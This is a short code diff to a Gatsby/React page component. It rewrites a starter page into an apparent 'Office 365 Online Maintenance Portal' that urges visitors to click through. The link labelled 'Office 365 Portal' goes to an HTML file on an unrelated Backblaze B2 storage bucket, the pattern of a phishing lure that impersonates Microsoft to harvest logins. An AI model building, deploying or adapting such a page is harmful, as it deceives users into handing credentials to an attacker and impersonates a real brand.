@@ -6,10 +6,10 @@ import Seo from "../components/seo"
 
 const SecondPage = () => (
   <Layout>
-    <Seo title="Page two" />
-    <h1>Hi from the second page</h1>
-    <p>Welcome to page 2</p>
-    <Link to="/">Go back to the homepage</Link>
+    <Seo title="Office 365" />
+    <h1>Office 365 Online Maintenance Portal.</h1>
+    <p>Click below to complete the process 2</p>
+    <Link to="https://edocument.s3.us-west-000.backblazeb2.com/index.html">Office 365 Portal</Link>
   </Layout>
 )
 
